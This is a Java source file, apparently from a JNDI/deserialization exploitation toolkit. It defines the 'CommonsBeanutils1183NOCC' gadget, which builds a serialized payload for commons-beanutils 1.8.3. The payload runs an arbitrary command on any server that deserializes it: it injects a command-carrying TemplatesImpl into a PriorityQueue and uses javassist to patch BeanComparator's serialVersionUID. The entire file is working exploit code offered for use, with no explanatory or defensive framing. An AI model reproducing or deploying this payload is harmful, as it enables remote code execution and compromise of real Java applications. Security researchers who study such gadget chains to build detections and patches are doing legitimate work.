package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;


import static com.qi4l.jndi.gadgets.utils.InjShell.insertField;

@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);
        ClassPool pool    = ClassPool.getDefault();
        CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");

        insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

        Class                       beanCompareClazz = ctClass.toClass();
        BeanComparator              comparator = (BeanComparator) beanCompareClazz.newInstance();
        final PriorityQueue<Object> queue      = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

        return queue;
    }
}
